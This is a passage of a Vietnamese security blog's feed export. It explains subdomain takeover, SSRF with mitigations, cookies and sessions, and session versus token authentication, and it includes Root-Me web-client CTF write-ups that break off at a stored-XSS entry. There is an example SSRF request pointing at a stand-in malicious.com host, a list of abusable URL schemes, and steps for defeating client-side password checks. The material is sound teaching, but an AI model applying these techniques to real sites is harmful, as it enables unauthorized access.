nữa và quên đăng kí thêm thời gian. Cùng với đó người quản trị không bỏ , thay đổi cấu hình trong DNS .Hacker sẽ tìm các ra subdomain  của người dùng  bằng các công cụ như Subfinder, SubStack , Amass,crt.sh … </p><figure class="wp-block-image"><img src="https://mamot.fr/system/media_attachments/files/007/727/655/original/8c42a00a677333d1.png?1577792038" alt="Kết quả hình ảnh cho subfinder"/></figure><p>Sau đó hacker sẽ tìm những subdomain nào không còn sử dụng nữa và khả năng tiếp quản nó. Sử dụng các dấu hiệu như sau để nhận biết :</p><figure class="wp-block-image"><img src="https://securitytrails.com/images/f/1/4/d/c/f14dc8034d6cf93efdf31c19c51b18bc97f19fa6-table.png" alt="tên miền phụ dễ bị chiếm đoạt tên miền phụ trong năm 2019"/></figure><p>Thường hacker sẽ sử dụng các command linux như: host, dig để tìm kiếm tên của bên thứ 3 (provider)</p><figure class="wp-block-image"><img src="https://www.researchgate.net/profile/S_M_Zia_Ur_Rashid/publication/332353497/figure/fig2/AS:746585789042693@1555011331203/Checking-DNS-Record-using-dig-command.png" alt="Kết quả hình ảnh cho dig command"/></figure><p>Tìm các subdomain có sử dụng bản ghi CNAME sẽ có khả năng tiếp quản rất cao bởi vì bản ghi CNAME là để dùng để liên kết 1 domain khác. Hacker sẽ đăng kí với bên thứ 3 đó để có tên miền như tên miền người dùng đăng kí và sau đó chỉ cần cấu hình subdomain được cung cấp nhận subdomain, ip tương ứng với cấu hình DNS của người dùng . SUBDOMAIN TAKEOVER!!!!</p><figure class="wp-block-image"><img src="https://0xpatrik.com/content/images/2018/06/takeover_basic.png" alt=""/></figure><p>Chi tiết thực hiện các bạn có thể tham khảo trong rất nhiều writeup,bugbounty progam :</p><ul><li><a href="https://medium.com/@ajdumanhug/subdomain-takeover-through-external-services-f0f7ee2b93bd">https://medium.com/@ajdumanhug/subdomain-takeover-through-external-services-f0f7ee2b93bd</a></li><li><a href="https://medium.com/@valeriyshevchenko/subdomain-takeover-with-shopify-heroku-and-something-more-6e9504da34a1">https://medium.com/@valeriyshevchenko/subdomain-takeover-with-shopify-heroku-and-something-more-6e9504da34a1</a></li><li><a href="https://hackerone.com/hacktivity">https://hackerone.com/hacktivity</a></li></ul><p> <strong>Làm thế nào để tránh những vấn đề như vậy?: -</strong> Luôn cập nhật hồ sơ DNS của bạn, xóa CNAME hoặc bất kỳ bản ghi DNS nào khác không được sử dụng.</p><p>Link tham khảo :</p><ul><li><a href="https://securitytrails.com/blog/subdomain-takeover-tips">https://securitytrails.com/blog/subdomain-takeover-tips</a></li><li><a href="https://blog.cystack.net/subdomain-takeover/">https://blog.cystack.net/subdomain-takeover/</a></li><li><a href="https://github.com/EdOverflow/can-i-take-over-xyz">https://github.com/EdOverflow/can-i-take-over-xyz</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Subdomain takeover được công bố vào năm 2014 là một kiểu tấn công vào tên miền phụ (Subdomain) của  một website và nguyên nhân dẫn đến là
      
    
    </summary>
    
    
      <category term="Pentest Web" scheme="http://blog.hydrasky.ml/tags/Pentest-Web/"/>
    
  </entry>
  
  <entry>
    <title>Server Side Request Forgery (PART 1)</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/Server%20Side%20Request%20Forgery%20(Part1)/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/Server Side Request Forgery (Part1)/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="wp-block-image"><img src="https://portswigger.net/web-security/images/server-side%20request%20forgery.svg" alt="SSRF"/><figcaption>Ảnh minh họa (PortSwigger)</figcaption></figure><p>Server site request Forgery gọi tắt là SSRF, ngược với lại <a href="http://hydrasky.ml/2020/03/cross-site-request-forgery">CSRF</a> đây là kiểu tấn công giả mạo yêu cầu phía máy chủ, máy chủ sẽ thực hiện các HTTP request đến các tên miền mà attacker muốn . Nguy hiểm hơn tấn công SSRF sẽ giúp hacker bypass và tấn công trực tiếp vào các hệ thống nội bộ (Internal) phía sau tường lửa (Firewall) hoặc các kết nối với bên thứ 3, thực hiện các hành động và truy cập trái phép vào dữ liệu của tổ chức.</p><p>Nhìn vào hình bên trên, nó sẽ giải thích cách tấn công SSRF, attacker sẽ gửi một URL có chứa payload tới nơi có chứa lỗ hổng trên web app thông qua Request A.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET payload?returnurl&#x3D;http:&#x2F;&#x2F;malicious.com&#x2F;</span><br><span class="line">HTTP&#x2F;1.1 Host: victim.com</span><br></pre></td></tr></table></figure><p>Trong yêu cầu trên, chúng ta có thể thấy máy chủ lưu trữ là victim.com và yêu cầu GET đang lấy tham số của “url” , tham số của url không được kiểm soát .Lúc này webapp sẽ lấy giá trị của “url” để tạo ra một request khác (Request B) tới “<a href="http://malicious.com&quot;/">http://malicious.com&quot;</a> . Máy chủ lúc này sẽ nhận và xử lý việc thực hiện request B .Tiếp tục webapp lúc này sẽ hiển thị một số hoặc toàn bộ kết quả trả về máy chủ , dựa vào đó attacker có thể truy cập dữ liệu trái phép hoặc thực hiện các cuộc tấn công khác như :</p><ul><li>Port Scanning</li><li>Denial of Service</li><li>Tấn công vào các ứng dụng khác trong hệ thống bằng các kĩ thuật như Buffer Overflow</li><li><a href="http://hydrasky.ml/2020/03/cross-site-scripting-part1">Cross Site Script</a></li></ul><figure class="wp-block-image"><img src="https://miro.medium.com/max/1368/1*FVIKVlXUN8_WqiVAmwM5GA.png" alt="Kết quả hình ảnh cho ssrf exploit"/><figcaption>Ví dụ SSRF</figcaption></figure><p>Trường hợp đặc biệt, webapp không trả về bất kì điều gì dấu hiệu gì thì vẫn có khả năng tồn tại lỗ hổng được gọi là Blind SSRF. Để xác định Blind SSRF bạn cần phải có một server bên ngoài mở một port bất kì và set payload của bạn về địa chỉ với port đang lắng nghe của server.</p><p>Hoặc đơn giản nhất bạn có thể dùng Burp Collaborator được tích hợp trong Burpsuite (Công cụ của PortSwigger) - <a href="https://portswigger.net/burp/documentation/collaborator">Link hướng dẫn</a> .</p><figure class="wp-block-image"><img src="https://static.packt-cdn.com/products/9781789531732/graphics/61e54233-2d8a-4ed6-aee1-2e4e10e77780.png" alt="Kết quả hình ảnh cho Burp Collaborator"/><figcaption>Burp Collaborator</figcaption></figure><h4>Cách ngăn chặn phòng chống SSRF</h4><p>Việc sử dụng blacklist và regular expressions để kiểm soát đầu vào rất khó và không hữu hiệu. Sử dụng backlist có thể ảnh hưởng đến các chức năng và công việc. Còn regular expressions thì cũng rất dễ để hacker tìm cách bypass như  <a href="http://www.pc-help.org/obscure.htm">Malicious URL’s Using DWORD Formatted IPAddresses </a>.</p><p>Phương pháp hiệu quả để tránh SSRF là liệt kê danh sách tên DNS hoặc địa chỉ IP mà ứng dụng của bạn cần truy cập (Whitelist). Thực chất SSRF không có bản sửa lỗi cụ thể vì nó phụ thuộc nhiều vào chức năng ứng dụng và yêu cầu kinh doanh. Việc sử dụng một loại list rất khó để bảo vệ nên kết hợp Backlist với whitelist  nhưng điều quan trọng là phải xác thực hợp lệ đầu vào của người dùng.</p><p>Không những phải kiểm xoát đầu vào bạn cần phải kiểm soát dữ liệu trả về cho người dùng.Để ngăn chặn dữ liệu phản hồi rò rỉ cho kẻ tấn công, phải đảm bảo rằng phản hồi nhận được như ý muốn.</p><p>Kẻ tấn công thường dùng<a href="https://en.wikipedia.org/wiki/List_of_URI_schemes"> URL schemas</a> để khai thác hệ thống thông qua lỗ hổng SSRF vì vậy nên vô hiệu hóa một số URL schemas như file:///, dict://, ftp:// và gopher://.</p><p>Kẻ tấn công có thể sử dụng lỗ hổng Server Side Request Forgery để truy cập một số dịch vụ này mà không cần bất kỳ xác thực nào.Do đó, để đảm bảo bảo mật ứng dụng web, tốt nhất là cho phép xác thực bất cứ nơi nào có thể, ngay cả đối với các dịch vụ trên mạng cục bộ.</p><p>Trong phần tiếp theo mình sẽ phân tích rõ các cách thức tấn công qua lỗ hổng này !</p><h4>Link tham khảo </h4><ul><li><a href="https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/">https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/</a></li><li><a href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a></li><li>Mastering Modern Web Penetration Testing Book - Prakhar Prasad</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;wp-block-image&quot;&gt;&lt;img src=&quot;https://portswigger.net/web-security/images/server-side%20request%20forgery.svg&quot; alt=&quot;SSRF&quot;/&gt;&lt;figca
      
    
    </summary>
    
    
      <category term="Pentest Web" scheme="http://blog.hydrasky.ml/tags/Pentest-Web/"/>
    
  </entry>
  
  <entry>
    <title>Session &amp; Cookie</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/Session%20&amp;%20Cookie/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/Session &amp; Cookie/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Mục tiêu của các cuộc tấn công như XSS  là lấy được session và cookie của nạn nhận. Vậy chúng là gì và tại sao là chúng mà không phải là username, password. Ok chúng ta cùng tìm hiểu nha.</p><h2>COOKIE</h2><p>Đầu tiên chúng ta cùng đến với cookie</p><div class="wp-block-media-text alignwide is-stacked-on-mobile"><figure class="wp-block-media-text__media"><img src="https://www.cookingclassy.com/wp-content/uploads/2014/06/chocolate-chip-cookie-16.jpg" alt="One Chocolate Chip Cookie - Cooking Classy"/></figure><div class="wp-block-media-text__content"><p class="has-large-font-size">Cookie</div></div><p>Cookie là một tệp tin chứa các thông tin nhỏ và hỗn tạp như id, username, timestamp … (mỗi giá trị này sẽ có một  <strong>key-value</strong>  ví dụ như <span style="text-decoration: underline;"><em> <strong>uuid</strong> </em></span>=12345 ) của người dùng vì vậy nó được ví như bánh cookie .Nó được tạo ra khi người dùng truy cập đến các trang web, server sẽ gửi nó đến browser và lưu trên máy tính của chúng ta. Nó sẽ được lưu tạm thời trong một khoảng thời gian (timeout) có thể là vài tuần hoặc tháng  .Khi người dùng truy cập đến trang web lần sau , browser sẽ gửi lại các thông tin này đến server .</p><p>Dựa vào tính chất có thể phân ra làm 2 loại cookie là Persistent cookie  và Session cookie, nó cũng chính là cookie và session. </p><h4>Mục đích của cookie để làm gì ?</h4><p>Cookie được xem là thành phần không thể thiếu đối với những website có lượng lớn dữ liệu, số lượng người dùng đông. Tác dụng đầu tiên có thể kể đến ở đây là cookie có thể dùng để duy trì trạng thái đăng nhập. Thay vì cứ mỗi lần truy cập vào trang web bạn phải đăng nhập lại thì cookie sẽ làm giúp bạn điều này .  Ngoài ra với cookie, các website còn có thể xác định các hành vi của người dùng như số khách hàng truy cập đến , tần xuất truy cập của một khách hàng vào trang, khách hàng mới hay khách hàng cũ, khách hàng đã xem cái gì. Vì vậy nó rất có ích và tiện lợi cho các web site thương mại điện tử.</p><p>Chắc bạn cũng thắc mắc tại sao khi mình truy cập vào các trang web A  xem cách sản phẩm sau đó truy cập vào các trang web B thì thấy nó quảng cáo sẩn phẩm A như kiểu mình bị theo dõi vậy haha. Nó là do website B sử dụng cookie của website A tạo ra  nó gọi là cookie bên thứ 3 (third party). Nó đôi khi khó chịu nhưng thôi cũng kệ !!!</p><p>Ở một số web, người ta sử dụng các tham số trong Cookies để tạo ra Session nhưng điều này thì không được khuyến nghị.</p><h4>Cookie có cần bảo mật không ?</h4><p>Tất nhiên là có, nó rất quan trọng ấy chứ!</p><p>Cookie lưu trữ các dữ liệu nhạy cảm vi nó chứa các thông tin của người dùng và đặc biệt là sessionid . Vì vậy để tránh bị tiết  lộ rộng rãi , chỉ cho phép website chứa cookie  mới có thể xem được thông tin này. Một số trình duyệt hiện tại có chức năng ngân chặn bên thứ 3 hoặc yêu cầu người dùng phải cấp quyền đọc cookie.<br>Ngoài ra có một số cách bảo vệ cookie hữu hiệu khỏi việc bị đọc trên trình duyêt (tấn công xss) hay trên kết nỗi tới server đó là sử dụng HTTPonly và Security flag. </p><h2>SESSION</h2><div class="wp-block-image"><figure class="aligncenter"><img src="https://media.hoclaptrinh.vn/images/session-la-gi-5c370b6a76d46.gif" alt="Session Là Gì?"/></figure></div><p>Session hay dân ta gọi là phiên làm việc hoặc trạng thái làm việc, một session bắt đầu khi client gửi request đến server, nó tồn tại xuyên suốt từ trang này đến trang khác trong ứng dụng web và chỉ kết thúc khi hết thời gian timeout hoặc khi bạn đóng ứng dụng. Với mỗi session sẽ được cấp phát một định danh duy nhất SessionID .Sẽ không có chuyện trùng lặp nha các bạn kể cả cùng một tài khoản đăng nhập trên hai trình duyệt . Và một điều nữa, khác với cookie , Session sẽ được lưu lại ở phía server.</p><p>Có bạn sẽ thắc mắc là “ Ơ thế sao tôi lại thấy session ở trong cookie gửi từ client lên?” hoặc “làm sao để server xác định session đó là của client nào?”</p><p> Session được tạo ra và lưu trên server (mk cx chưa biết mặt mũi nó thế nào nhưng cũng không cần quan tâm ),đồng thời nó tạo ra một tệp tin chứa id session gọi là session cookie (sessionid) gửi cho client  lưu trên bộ nhớ cache của trình duyệt. Do đó cái chúng ta thường thấy trong cookie của request đó là Sessionid chứ không phải là session. </p><p> Còn làm sao để xác thực thì bạn biết rồi đấy, nó đi cùng cookie mà nhưng cũng chính vì điều này mà hacker có thể chiếm session của bạn.</p><h4>Thế mục đích của Session để làm gì ?</h4><p>Một session có thể lưu trữ tạm thời thông tin liên quan đến các hoạt động ở của người dùng  trong khi kết nối . Ví dụ như bạn click vào sản phẩm, thêm sản phẩm vào mục xem sau, … . Nó chỉ có tác dụng kiểm tra khi 1 phiên bắt đầu và kết thúc tại thời điểm nào .</p><p>Tùy vào mục đích công việc mà bạn nên sử dụng session hợp lý nhất nhằm mang lại hiệu quả tối đa. Dưới đây là những lĩnh vực cần:</p><p> <strong>Các ứng dụng thương mại điện tử</strong> : Có thể xem xét các phiên để xem người dùng mất bao lâu để chuyển đổi hoặc thời gian trung bình của người dùng theo từng trang. Mục đích này sẽ giúp họ biết được sản phẩm nào được người dùng chú ý.</p><p> <strong>Các nhà phát triển trò chơi, game online</strong> : Có thể phân tích thời lượng phiên của họ để xem liệu người dùng có đầu tư đủ thời gian vào trò chơi để tận hưởng trải nghiệm được cung cấp hay không.</p><p> <strong>Các ứng dụng truyền thông xã hội</strong> : Có thể kiểm tra số phiên trong suốt một ngày để xem liệu người dùng có biến công cụ này thành một phần thiết yếu trong cuộc sống hàng ngày của họ hay không.</p><p>Nhưng giống với cookie, session cũng có thể dùng để duy trì trạng thái đăng nhập nhưng chỉ trong thời gian ngắn. Và đây là nguyên nhân hacker  muốn chiến session bạn.</p><h4>Bảo mật cho session ?</h4><p>Ngoài việc server tạo các session có thể dễ đoán ra thì bình thường nó vẫn rất an toàn, an toàn hơn nhiều so với cookie. Bởi nó  không thể thay đổi giá trị  khi được lưu trữ trên server. Hacker chỉ có thể tìm cách là ăn trộm nó qua các lỗ hổng như XSS, Session hijacking và đọc được request của bạn.</p><p>Một khuyến nghị cho các bạn đọc là không nên thực hiện các giao dịch hay truy cập tài khoản ở các điểm truy cập internet công cộng, bạn sẽ rất dễ bị hack.</p><p>###So Sánh Cookie vs Session</p><p>Bây giờ chúng ta cùng Cùng so sánh các điểm khác biệt giữa chúng nha.</p><!-- wp:table --><figure class="wp-block-table"><table><tbody><tr><td>                           **Cookie** </td><td>                          **Session** </td></tr><tr><td>Cookie được lưu trữ trên trình duyệt của người dùng.</td><td>Session không được lưu trữ trên trình duyệt.</td></tr><tr><td>Dữ liệu cookie được lưu trữ ở phía client.</td><td>Dữ liệu session được lưu trữ ở phía server.</td></tr><tr><td>Dữ liệu cookie dễ dàng sửa đổi hoặc đánh cắp khi chúng được lưu trữ ở phía client.</td><td>Dữ liệu session không dễ dàng sửa đổi vì chúng được lưu trữ ở phía máy chủ.</td></tr><tr><td>Dữ liệu cookie có sẵn trong trình duyệt đến khi expired.</td><td>Sau khi đóng trình duyệt sẽ hết phiên làm việc (session)</td></tr></tbody></table></figure><!-- /wp:table --><p>Ok như vậy là mình dã trình bày một số kiển thức về session và token. Các bạn có ý kiến gì hãy để lại comment cho minh nhé!</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Mục tiêu của các cuộc tấn công như XSS  là lấy được session và cookie của nạn nhận. Vậy chúng là gì và tại sao là chúng mà không phải là 
      
    
    </summary>
    
    
      <category term="Technology" scheme="http://blog.hydrasky.ml/tags/Technology/"/>
    
  </entry>
  
  <entry>
    <title>Session &amp; Token-Based Authentication</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/Session%20vs%20Token-Based%20Authentication/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/Session vs Token-Based Authentication/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Xin chào các bạn, bài viết này mĩnh sẽ nói về 2 cơ chế xác thực người dùng dựa vào session và token. Chắc nhiều bạn thấy chúng rât nhiều nhưng cũng chưa rõ nó hoạt động như thế nào .Ok chúng ta cùng tìm hiểu nào.</p><h4>Tại sao lại dùng session hay token để xác thực người dùng ?</h4><p>Như các bạn đã biết việc giao tiếp giữa trình duyệt web (user) với  với máy chủ sẽ sử dụng giao thức truyền siêu văn bản  HTTP (Hypertext Transfer Protocol) . Mà HTTP là một giao thức phi trạng thái (Stateless) - phiên kết nối (TCP session) sẽ mất khi gói tin đến đích . Điều đó đồng nghĩa với việc mỗi lần user request đến tài nguyên cần xác thực họ sẽ phải đăng nhập một lần. Oh Bully sh!t ! Vì vậy người ta cần tìm cách để có thể xác thực và duy trì trạng thái đăng nhập cho người dùng và đó là lí do  dùng đến session và token. Thực ra ngoài hai phương thức này còn một phương thức cổ điển nữa mà thỉnh thoảng ta vẫn hay gặp đó là HTTP basic authentication nhưng nó rất đơn giản, thô và thường chỉ sử dụng trong nội bộ nên mình sẽ bỏ qua. Ok tiếp tục nào !</p><h2>Session based Authentication</h2><p>Trong bài viết trước của mình có giải thích về session , bạn nào chưa biết có thể tham khảo. Session sẽ được tạo ra khi user request đến server và server sẽ gửi sessionid về browser và lưu trữ ở cache browser. Các request tiếp theo từ browser lên server thì sessionid được đính kèm dưới dạng cookie . Server sẽ thực hiện so sánh giá trị sessionid và trả response về.</p><figure class="wp-block-image"><img src="https://images.viblo.asia/full/fdd3546f-1ee6-4ea7-afa4-d07189532c30.png" alt=""/></figure><h3> **Ưu điểm:** </h3><p> <strong>Thông tin được giấu kín, an toàn:</strong> Client chỉ được biết tới <strong>Session ID</strong> thường là 1 chuỗi random hoặc đã được băm không có thông tin gì của người dùng, còn mọi thông tin khác của phiên đăng nhập hay người dùng hiện tại đều được lưu phía server nên cơ chế này giữ kín được thông tin của người dùng trong quá trình truyền tải.</p><p> <strong>Fully-controlled session:</strong> Tính chất này có thể cho phép hệ thống quản trị được <strong>TẤT CẢ</strong> các hoạt động liên quan tới phiên đăng nhập của người dùng như thời gian login, force logout,…</p><h3>Nhược điểm</h3><p> <strong>Chiếm nhiều bộ nhớ:</strong> Với mỗi phiên làm việc của user, server sẽ lại phải tạo ra một session và lưu vào bộ nhớ trên server. Số data này có thể còn lớn hơn cả user database của bạn do mỗi user có thể có vài session khác nhau. Do vậy việc tra cứu đối với các hệ thống lớn nhiều người dùng sẽ là vấn đề.</p><p> <strong>Khả năng bị  tấn công CSRF:</strong> Nói nôm na là doSession IDthường được lưu vàocookie mà  cookie đượctự độnggắn vào các request tới domain của bạn.</p><p> <strong>Không có khả năng mở rộng (Scalability)  với các flatform khác:</strong> </p><p>Bây giờ hãy thử tưởng tượng chúng ta đang có một trang web hoạt động ngon lành với Session rồi, nhưng tới một ngày chúng ta phải làm thêm các Native Apps (ứng dụng di động) cho hệ thống là IOS hoặc Android, và cùng sử dụng chung một Database với ứng dụng web hiện tại thì như thế nào?</p><p>Rõ ràng lúc này chúng ta sẽ không thể xác thực người dùng sử dụng Native app bằng Session được vì Native app không có Cookie, chỉ Browser mới có mà thôi.</p><p>Vậy nên Token-Based Authentication - JWT mới được sinh ra trên thế giới lập trình này để giải quyết vấn đề trên và hiện nay nó luôn được ưu tiên lựa chọn mỗi khi bắt đầu làm một dự án mới.</p><p> Mặc dù vậy, hiện tại Session-based Authentication thường được dùng trong các website thương mại ,nhỏ vừa (tham khảo phần mục đích của session trong bài viết của mình) và những ứng dụng web làm việc chủ yếu với browser, những hệ thống monolithic do cần sự tập trung trong việc lưu session data và sự hạn chế về domain.</p><h2>Token-Based Authentication</h2><p>Token-Based Authentication đã ra mắt cũng  được vài năm, nó đề xuất bởi OAuth 2.0 Framework. Cách thức hoạt động của kĩ thuật này khá giống với với Session-Based Authentication nhưng các công nghệ ngày nay vẫn ưu tiên sử dụng nó hơn, tại sao nhỉ?</p><p>Điều đầu tiên cần nhớ, Token-Based Authentication là statefull (khác với session ) vì vậy server sẽ không lưu trữ hồ sơ về việc người dùng đã đăng nhập hay token đã được tạo. </p><p>Dựa vào định dạng sẽ có 3 loại token chính là SAML ( Security Markup  Assertion Language), SWT ( Simple Web Token) và JWT (Json Web Token). Chi tiết về các loại này mình sẽ có bài viết riêng và trong bài này mĩnh sẽ lấy JWT để nói vì nó được chấp nhận và sử dụng rộng rãi như một tiêu chuẩn của các nền tảng web hiện đại (<a href="https://tools.ietf.org/html/rfc7519">RFC 7519</a>) . </p><p>Nói qua một chút về JWT  để các bạn có hiểu rõ hơn về quy trình xác thực của nó (Chi tiết sẽ có bài viết riêng). JWT token định nghĩa là cách thức xác thực giữa các ứng dụng bằng một đối tượngJSON <strong>,</strong> nó bao gồm 3 phần lầ header, payload và chữ ký (signature). JWT sử dụng chữ kí số để đảm bảo tính toàn vẹn của token được tạo, phần payload sẽ chứa các thông tin của người dùng để xác thực , còn header để chỉ định thuật toán để mã hóa.</p><p> Dưới đây là Flow của Token-based Authentication:</p><figure class="wp-block-image"><img src="https://images.viblo.asia/17eeed29-52cf-4b4c-92b4-17c9adeb249a.png" alt="Session và Token Based Authentication - Viblo"/></figure><p>Đầu tiên user submit username/password , sau khi check thông tin hợp lệ server sẽ tạo token và trả lại token trong response cho người dùng. Phía client sẽ thực hiện lưu trữ, nếu như là trình duyệt web thì JWT có thể lưu vào Local Storage, IOS app thì sẽ là Keychain và Android app sẽ lưu vào SharedPreferences. Các request tiếp theo token sẽ được thêm vào request ở các vị trí như là Athorization header , URL , Cookie header hoặc request body. Server sẽ check token bằng cách kiểm tra chữ kí số (signature) , đảm bảo thông tin trong token là chính xác và token đó do server tạo ra. Response sẽ  được trả về nếu thành công hoặc thông báo lỗi xác thực nếu thất bại hoặc là lỗi 401 <strong><em>Unauthentication</em></strong>.</p><img src="/images/SS/image-13.png" class="[class names]" title="[500] [500] " alt="ERROR"><h4> **Ưu điểm** :</h4><ul><li> ** **Phù hợp với nhiều loại client:** ** Nên nhớ, cookie là một concept đượccác browseráp dụng tự động, còn với các client sử dụng Web API như mobile, IoT device, server,... thì việc sử dụng cookie lại rất hạn chế. Sử dụng token trong header hay URL,... sẽ dễ dàng hơn cho client trong việc lưu lại token và truyền tải token.</li><li> **Scalability:**  Dễ dàng mở rộng server hơn. Điều này là nhờ tính stateless của JWT, server không cần phải lưu session state, nên trong trường hợp phía server sử dụng cơ chế load balancing, bất kỳ máy server nào cũng có thể handle request và vẫn có được state của user thay vì chỉ server mà user đã login.</li><li> **Chống CSRF:** Thông thường thì token được thêm vào URL hoặc Authorization header và request body ( kèm trong cookie rất ít ) nên sẽ phòng chống được các trường hợp tấn công như với trường hợp session/cookie. Ngoài ra ,theo như RFC thì token cũng có nhiều loại trong đó có lại chỉ sử dụng một lần hoặc chỉ dùng cho một hành động.</li></ul><h4>Nhược điểm:</h4><p> <strong>Phức tạp cho phía client</strong> : Cơ chế sử dụng token thường yêu cầu client phải có xử lý liên quan tới lưu token, gửi token, do vậy sẽ không phù hợp với những website kiểu cũ, sử dụng nhiều server render html và phần javascript hạn chế.</p><p> <strong>Thông tin dễ lộ:</strong>  JWTnókhông ẩn, không làm mờ, không che giấu dữ liệu gì cả, mà nó được sử dụng đểchứng minh rằng dữ liệu được tạo ra bởi một nguồn xác thực. Dữ liệu trong payload chỉ được Encoded bằng base64urlencode chứ không phải Encrypted. Chính vì vậy, thông thường người ta chỉ lưu 1 số thông tin thiết yếu như user_id, username mà không lưu những thông tin nhạy cảm như password vào token vgiao thức mã hóa đường truyền HTTPS để tránh tấn công MITM .</p><p>Ok minh đã trình bày tổng quát về 2 các xác thực dựa vào session và token. Các bạn muốm tìm hiểu sâu hơn có thể tham khảo link mình đã đểm bên dưới. Cảm ơn các bạn đã đọc bài !</p><h2>Tham khảo</h2><ul><li><a href="https://kipalog.com/posts/Authentication-story-part-2--Authentication-co-ban">https://kipalog.com/posts/Authentication-story-part-2--Authentication-co-ban</a></li><li><a href="https://wp-rocket.me/blog/difference-json-web-tokens-vs-session-cookies/">https://wp-rocket.me/blog/difference-json-web-tokens-vs-session-cookies/</a></li><li><a href="https://trungquandev.com/hieu-sau-ve-jwt-json-web-tokens/">https://trungquandev.com/hieu-sau-ve-jwt-json-web-tokens/</a></li><li>Token-Based vs Session-Based Authentication: A survey</li><li>Pro ASP.NET Web API Security Securing ASP.NET Web API by by Badrinarayanan Lakshmiraghavan</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Xin chào các bạn, bài viết này mĩnh sẽ nói về 2 cơ chế xác thực người dùng dựa vào session và token. Chắc nhiều bạn thấy chúng rât nhiều 
      
    
    </summary>
    
    
      <category term="Technology" scheme="http://blog.hydrasky.ml/tags/Technology/"/>
    
  </entry>
  
  <entry>
    <title>RooMe (Web-client)</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/WEB-CLIENT/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/WEB-CLIENT/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[ <img src="/images/CTF/Rootme.jpg" class="[class names]" title="[500] [500] " alt="Root Me"><h2>HTML – disabled buttons</h2><h4> **Resolution** </h4><p>Ở đây ta có 2 thẻ html ẩn bị ẩn , inspect (F12 -&gt; Elements) nó ra t sẽ thấy 2 tag bị disabled . </p> <img src="/images/CTF/image-1.png" class="[class names]" title="[500] [500] " alt="Tag input bị disable bằng thuộc tính "><p>Xóa thuộc tính “disabled” xong là có thể sử dụng được, từ đó submit bất cứ cái gì là sẽ có pass.</p> <img src="/images/CTF/image-12.png" class="[class names]" title="[500] [500] " alt="Pass nhận được (Xin giấu pass )"><figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-1.png" alt="" class="wp-image-9"/><figcaption>Pass nhận được (Xin giấu pass )</figcaption></figure><h2> **Javascript - Authentication** </h2><h3> **Resolution** </h3><p>View page source ta sẽ thấy việc xử lí đăng nhập sẽ qua file “login.js” </p> <img src="/images/CTF/image-2.png" class="[class names]" title="[500] [500] " alt="File login.js"><p>Check file ta thấy luôn được user và password để đăng nhập. Và pass cx để bypass challenge</p> <img src="/images/CTF/image-3.png" class="[class names]" title="[500] [500] " alt="File login.js"><h2>Javascript - Source</h2><h3>Resolution</h3><p>Tương tự như challenge 2 bạn chỉ cần view page soure sẽ thấy password.</p><h2>Javascript - Authentication 2</h2><h3>R **esolution** </h3><p>Tương tự như challenge 2 bạn chỉ cần view page soure sẽ thấy file login.js . Nhưng ở đâu cần một chút kiến thức về js để lấy được user và password.</p> <img src="/images/CTF/image-4.png" class="[class names]" title="[500] [500] " alt="file login.js"><p>Như ta có thể thấy TheLists=”GOD:HIDDEN” =&gt; TheLists[i].split(“:”) =&gt; TheSplit[0] = “GOD” ; TheSplit[1]= “HIDDEN” =&gt; Username, Password.</p><h2>Javascript - Obfuscation 1</h2><h3>Resolution</h3> <img src="/images/CTF/image-5.png" class="[class names]" title="[500] [500] " alt="Password bị mã hóa"><p>Nhìn qua ta thấy được password được mã hóa bằng URL encode. Sau khi decode ra ta có pass .</p><h2>Javascript - Obfuscation 2</h2><h3>Resolution</h3> <img src="/images/CTF/image-6.png" class="[class names]" title="[500] [500] " alt="Password bị mã hóa"><p>Ở challeng này password được mã hóa bằng URL encode  + Unescape  + Convert ascii =&gt; String =&gt; Password</p><h2>Javascript - Native code</h2><h3>Resolution</h3> <img src="/images/CTF/image-7.png" class="[class names]" title="[500] [500] " alt=" "><p>Sử dụng console để decode và tìm ra password</p> <img src="/images/CTF/image-8.png" class="[class names]" title="[500] [500] " alt="Tag input bị disable bằng thuộc tính "><h2>Javascript - Obfuscation 3</h2><p>View page source ta thấy đoạn javascript, nhưng để tìm ra pass ta ko cần chú ý đến phần dechiffre() chỉ cần decode phần này:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));</span><br></pre></td></tr></table></figure><p>Chuyển các giá trị hex sang string ta sẽ được chuỗi “55, 56, 54, 79, 115, 69, 114, 116, 107, 49, 50”.</p><p>Xong bỏ vô String.fromCharCode(), có thể dùng console là ta có kết quả.</p><h2>XSS - Stored 1</h2> <img src="/images/CTF/image-10.png" class="[class names]" title="[500] [500] " alt="Form chat vs admin"><p>Để tạo một xss stored bạn chỉ 